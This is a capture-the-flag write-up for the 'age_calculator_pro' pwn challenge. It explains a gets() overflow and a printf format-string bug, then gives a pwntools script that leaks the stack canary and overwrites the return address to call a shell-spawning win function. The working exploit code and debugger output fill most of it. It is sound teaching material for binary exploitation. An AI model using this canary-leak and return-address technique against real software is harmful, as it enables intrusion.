# Write-up for pwn-age_calculator_pro by CTF_OliCyber.IT

## Summary

It's a ret2win challenge with stack protection enabled. So we're going to be faced with a canary.

## Static Analysis

We will go straight out to main to see what's going on. IDA saved us a lot of disassembling work.
We just changed the "v13" to "canary", just to be more clear.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-54h]
  char format[8]; // [rsp+10h] [rbp-50h] BYREF
  __int64 v6; // [rsp+18h] [rbp-48h]
  __int64 v7; // [rsp+20h] [rbp-40h]
  __int64 v8; // [rsp+28h] [rbp-38h]
  __int64 v9; // [rsp+30h] [rbp-30h]
  __int64 v10; // [rsp+38h] [rbp-28h]
  __int64 v11; // [rsp+40h] [rbp-20h]
  __int64 v12; // [rsp+48h] [rbp-18h]
  unsigned __int64 canary; // [rsp+58h] [rbp-8h]

  canary = __readfsqword(0x28u);
  *(_QWORD *)format = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  init(argc, argv, envp);
  puts("What's your name?");
  gets(format);
  printf(format);
  puts(", what's your birth year?");
  gets(format);
  v4 = atoi(format);
  printf("You are %d years old!\n", (unsigned int)(2024 - v4));
  return 0;
}
```

Obviously, we have a buffer overflow here cause it's using the gets function which is not checking the data that is stored to the buffer. 
Also, another vulnerability here is in the first printf. It's printing the buffer raw, without a format string specifier and that can lead to data leak from the stack.

To get the flag, we want to call the win function to spawn a shell, but we can't call it directly because it is never called by main. So we have to exploit it somehow .

```c
unsigned __int64 win()
{
  char *envp; // [rsp+8h] [rbp-28h] BYREF
  char *argv[3]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  argv[0] = "/bin/sh";
  argv[1] = 0LL;
  envp = 0LL;
  execve("/bin/sh", argv, &envp);
  return v3 - __readfsqword(0x28u);
}
```

## Plan

The plan will be this: First, we will insert some format specifiers to try to leak the canary. After that, we will grab it and overwrite the rip with the address of win.

We will write a python script to automate things and do it a little faster. We will insert some "%p" specifiers, which is for printing the address of pointers. We are trying to find the canary. Most of the time the canary address will end with "00". So that is what are we looking for. We will print the leaked values and attach gdb to analyze them.

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('age_calculator_pro', checksec=False)
p = process()
#context.log_level = 'debug'

frmt_string = b'|%p' * 20

p.sendlineafter(b'?', frmt_string)
p.recvline() # empty line
leak = p.recvline().split(b'|')
info(leak)
raw_input('gdb')
```

```shell
┌──(vein㉿vein)-[~/sec/CTF_OliCyber.IT/pwn_age_calculator_pro]
└─$ ./exploit.py
[+] Starting local process '/home/vein/sec/CTF_OliCyber.IT/pwn_age_calculator_pro/age_calculator_pro': pid 50583
[*] [b'', b'0x7fe36805ab23', b'(nil)', b'0x7fe36805aaa0', b'(nil)', b'(nil)', b'(nil)', b'(nil)', b'0x257c70257c70257c', b'0x7c70257c70257c70', b'0x70257c70257c7025', b'0x257c70257c70257c', b'0x7c70257c70257c70', b'0x70257c70257c7025', b'0x257c70257c70257c', b'0x70257c70', b'(nil)', b'0x24d6f325ad209a00', b'0x1', b'0x7fe367eae6ca', b"(nil), what's your birth year?\n"]
gdb
```

```nasm
pwndbg> canary
AT_RANDOM = 0x7ffe77ba1d19 # points to (not masked) global canary value
Canary    = 0x24d6f325ad209a00 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7ffe77ba1758 ◂— 0x24d6f325ad209a00
00:0000│  0x7ffe77ba18d8 ◂— 0x24d6f325ad209a00
00:0000│  0x7ffe77ba1978 ◂— 0x24d6f325ad209a00
```

So, the canary will be in the 17th element on the stack. We can't grab the address immediately, because it will change every time we run the program. But this isn't a problem cause we can use python to grab it for us.

```python
canary = int(leak[17], 16)
info(f"canary at: {hex(canary)}")
```

 Now for the last part of our exploit, we need to know how is the stack alignment after our input to avoid crushing the program. 
 We can find it with gdb with inserting some string and setting a breakpoint after the gets function.
The canary for this time will be "0xf0f7e6fa75d95d00".

```nasm
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000040132b <+0>:     endbr64
   0x000000000040132f <+4>:     push   rbp
   0x0000000000401330 <+5>:     mov    rbp,rsp
   0x0000000000401333 <+8>:     sub    rsp,0x60
   0x0000000000401337 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401340 <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401344 <+25>:    xor    eax,eax
   0x0000000000401346 <+27>:    mov    QWORD PTR [rbp-0x50],0x0
   0x000000000040134e <+35>:    mov    QWORD PTR [rbp-0x48],0x0
   0x0000000000401356 <+43>:    mov    QWORD PTR [rbp-0x40],0x0
   0x000000000040135e <+51>:    mov    QWORD PTR [rbp-0x38],0x0
   0x0000000000401366 <+59>:    mov    QWORD PTR [rbp-0x30],0x0
   0x000000000040136e <+67>:    mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000401376 <+75>:    mov    QWORD PTR [rbp-0x20],0x0
   0x000000000040137e <+83>:    mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000401386 <+91>:    mov    DWORD PTR [rbp-0x54],0x0
   0x000000000040138d <+98>:    mov    eax,0x0
   0x0000000000401392 <+103>:   call   0x40125d <init>
   0x0000000000401397 <+108>:   lea    rax,[rip+0xeae]        # 0x40224c
   0x000000000040139e <+115>:   mov    rdi,rax
   0x00000000004013a1 <+118>:   call   0x4010a0 <puts@plt>
   0x00000000004013a6 <+123>:   lea    rax,[rbp-0x50]
   0x00000000004013aa <+127>:   mov    rdi,rax
   0x00000000004013ad <+130>:   call   0x4010e0 <gets@plt>
   0x00000000004013b2 <+135>:   lea    rax,[rbp-0x50]
   0x00000000004013b6 <+139>:   mov    rdi,rax
   0x00000000004013b9 <+142>:   mov    eax,0x0
   0x00000000004013be <+147>:   call   0x4010c0 <printf@plt>
   0x00000000004013c3 <+152>:   lea    rax,[rip+0xe94]        # 0x40225e
   0x00000000004013ca <+159>:   mov    rdi,rax
   0x00000000004013cd <+162>:   call   0x4010a0 <puts@plt>
   0x00000000004013d2 <+167>:   lea    rax,[rbp-0x50]
   0x00000000004013d6 <+171>:   mov    rdi,rax
   0x00000000004013d9 <+174>:   call   0x4010e0 <gets@plt>
   0x00000000004013de <+179>:   lea    rax,[rbp-0x50]
   0x00000000004013e2 <+183>:   mov    rdi,rax
   0x00000000004013e5 <+186>:   call   0x401100 <atoi@plt>
   0x00000000004013ea <+191>:   mov    DWORD PTR [rbp-0x54],eax
   0x00000000004013ed <+194>:   mov    eax,0x7e8
   0x00000000004013f2 <+199>:   sub    eax,DWORD PTR [rbp-0x54]
   0x00000000004013f5 <+202>:   mov    esi,eax
   0x00000000004013f7 <+204>:   lea    rax,[rip+0xe7a]        # 0x402278
   0x00000000004013fe <+211>:   mov    rdi,rax
   0x0000000000401401 <+214>:   mov    eax,0x0
   0x0000000000401406 <+219>:   call   0x4010c0 <printf@plt>
   0x000000000040140b <+224>:   mov    eax,0x0
   0x0000000000401410 <+229>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401414 <+233>:   sub    rdx,QWORD PTR fs:0x28
   0x000000000040141d <+242>:   je     0x401424 <main+249>
   0x000000000040141f <+244>:   call   0x4010b0 <__stack_chk_fail@plt>
   0x0000000000401424 <+249>:   leave
   0x0000000000401425 <+250>:   ret
End of assembler dump.
pwndbg> b *0x00000000004013b2
Breakpoint 1 at 0x4013b2
```

We run it and we run the telescope command to see what is happening.

```nasm
pwndbg> telescope 20
00:0000│ rsp 0x7fffffffdca0 ◂— 0x0
01:0008│-058 0x7fffffffdca8 ◂— 0x0
02:0010│ rax 0x7fffffffdcb0 ◂— 'deadbeef'
03:0018│-048 0x7fffffffdcb8 ◂— 0x0
... ↓        7 skipped
0b:0058│-008 0x7fffffffdcf8 ◂— 0xf0f7e6fa75d95d00
0c:0060│ rbp 0x7fffffffdd00 ◂— 0x1
0d:0068│+008 0x7fffffffdd08 —▸ 0x7ffff7df66ca (__libc_start_call_main+122) ◂— mov edi, eax
0e:0070│+010 0x7fffffffdd10 ◂— 0x0
0f:0078│+018 0x7fffffffdd18 —▸ 0x40132b (main) ◂— endbr64 
10:0080│+020 0x7fffffffdd20 ◂— 0x100000000
11:0088│+028 0x7fffffffdd28 —▸ 0x7fffffffde18 —▸ 0x7fffffffe161 ◂— '/home/vein/sec/CTF_OliCyber.IT/pwn_age_calculator_pro/age_calculator_pro'
12:0090│+030 0x7fffffffdd30 —▸ 0x7fffffffde18 —▸ 0x7fffffffe161 ◂— '/home/vein/sec/CTF_OliCyber.IT/pwn_age_calculator_pro/age_calculator_pro'
13:0098│+038 0x7fffffffdd38 ◂— 0xee01ba004c3bbe18
pwndbg> x 0x7fffffffdcf8 - 0x7fffffffdcb0
0x48:   Cannot access memory at address 0x48
```

We will substract the address of our input - the address of the canary = 0x48 = 72 bytes
So the padding is 72 bytes long to reach the canary.  But additional we will need +8 bytes after the canary cause we have an extra block before we reach the main's return address.

## Exploit

So, the final exploit will look like this:

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('age_calculator_pro', checksec=False)
p = process()
#context.log_level = 'debug'

frmt_string = b'|%p' * 20

p.sendlineafter(b'?', frmt_string)
p.recvline() # empty line
leak = p.recvline().split(b'|')
info(leak)

canary = int(leak[17], 16)
info(f"canary at: {hex(canary)}")
#raw_input('gdb')

payload = b'a' * 0x48
payload += p64(canary)
payload += p64(0x8)
payload += p64(elf.sym.win)

p.sendline(payload)
p.interactive()
```

And we get a shell!

```shell
┌──(vein㉿vein)-[~/sec/CTF_OliCyber.IT/pwn_age_calculator_pro]
└─$ ./exploit.py
[+] Starting local process '/home/vein/sec/CTF_OliCyber.IT/pwn_age_calculator_pro/age_calculator_pro': pid 63473
[*] [b'', b'0x7f8fe7fecb23', b'(nil)', b'0x7f8fe7fecaa0', b'(nil)', b'(nil)', b'(nil)', b'(nil)', b'0x257c70257c70257c', b'0x7c70257c70257c70', b'0x70257c70257c7025', b'0x257c70257c70257c', b'0x7c70257c70257c70', b'0x70257c70257c7025', b'0x257c70257c70257c', b'0x70257c70', b'(nil)', b'0x3872cd6dce4bf300', b'0x1', b'0x7f8fe7e406ca', b"(nil), what's your birth year?\n"]
[*] canary at: 0x3872cd6dce4bf300
[*] Switching to interactive mode
You are 2024 years old!
$ id
uid=1000(vein) gid=1000(vein) groups=1000(vein)
```
